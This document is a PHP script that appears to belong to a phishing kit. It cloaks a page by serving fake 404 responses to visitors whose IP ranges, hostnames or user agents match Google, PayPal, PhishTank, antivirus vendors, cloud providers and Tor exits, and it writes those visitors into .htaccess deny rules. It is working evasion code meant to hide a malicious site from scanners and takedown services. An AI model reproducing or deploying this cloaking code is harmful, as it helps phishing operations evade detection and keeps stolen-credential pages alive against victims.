<?php
ob_start();
ini_set('display_errors',0);
$ipa = $_SERVER['HTTP_CLIENT_IP']? $_SERVER['HTTP_CLIENT_IP'] : ($_SERVER['HTTP_X_FORWARDE‌​D_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'] );
$useragent = $_SERVER['HTTP_USER_AGENT'];

if(isset($_POST['gotcha'])){
     blockBot($ipa);
}

$hostname = gethostbyaddr($ipa);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "paypal");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($ip,$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$ipa)){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}


$bad = array('InfoSec', 'GIP', 'google', 'usa', 'bot', 'Avast', 'Grisoft', 'drweb', 'Dr.Web', 'scanurl', 'facebook', 'softlayer', 'amazonaws', 'cyveillance', 'phishtank', 'dreamhost', 'Avira', 'Bitdefender', 'BullGuard', 'Point', 'Comodo', 'ESET', 'F-Secure', 'Kaspersky', 'KingSoft', 'McAfee', 'Panda', 'PSafe', 'Sophos', 'Symantec', 'Trend Micro', 'TrustPort', 'Webroot', 'Zemana', 'Intego', 'AhnLab', 'Sourcefire', 'haus', 'Netcraft', 'digitalwatch', 'digitalguardian', 'wombatsecurity', 'wombat', 'bing', 'microsoft', 'izoologic', 'amtso', 'safebrowsing', 'malware', 'oracle', 'urlblacklist', 'shallalist', 'virustotal', 'LVLT', 'LVLT-GOOGL', 'GSA', 'Linode', 'hostinger', 'netpilot', 'calyxinstitute', 'tor-exit', 'GTT', 'BROADCLIP', ' Vultr', 'LEASE', 'dediserv.eu', 'REDCOM', 'RONIK', 'Zencurity', 'Bharat', 'Belgium', 'EGI', 'CONEC', 'Russia', 'kerberos', 'EVERTEST', 'SHIELD', 'ONYX', 'RABOT', 'DEDFIBERCO', 'XOXO', 'Calyx', 'ZSCALER', 'Bayan', 'Gesellschaft', 'Magic', 'GITS', 'SOPHIA', 'SKYNETBE', 'SGAOS', 'BONE', 'ADISTA', 'CORBINA', 'DIGITALOCEAN', 'AT&T', 'Verizon', 'FORCEPOINT', 'MSFT-GFS', 'united states', 'Amsterdam', 'united', 'Broomfield');
foreach($bad as $zbal) {
    if(stripos($useragent,$zbal) !== false) {
        file_put_contents('badbot.txt', $ipa, FILE_APPEND | LOCK_EX);
        blockBot($ipa);
    }
}


function blockBot($ip){
$bot = 'deny from '.$ip;
$myfile = file_put_contents('.htaccess', PHP_EOL.$bot.PHP_EOL , FILE_APPEND | LOCK_EX);
header('HTTP/1.0 404 Not Found');
die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
ob_end_flush();
?>
